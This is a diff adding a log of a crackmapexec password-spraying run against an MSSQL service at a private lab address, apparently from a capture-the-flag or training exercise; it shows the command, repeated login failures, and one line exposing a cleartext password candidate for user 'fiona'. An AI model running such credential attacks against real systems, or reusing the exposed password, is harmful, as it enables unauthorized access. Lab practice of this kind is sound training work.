@@ -1,0 +1,23 @@
+### [2026-04-22 21:30:35] crackmapexec mssql 10.129.203.10 -u fiona -p server3_passwords.txt
+
+$ crackmapexec mssql 10.129.203.10 -u fiona -p server3_passwords.txt
+
+MSSQL                    10.129.203.10   1433   WIN-HARD         [*] Windows 10 / Server 2019 Build 17763 (name:WIN-HARD) (domain:WIN-HARD)
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl name 'logging' is not defined
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+MSSQL                    10.129.203.10   1433   WIN-HARD         [-] ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+
+# Exit code: 0
+# Duration: 2026-04-22 21:30:56
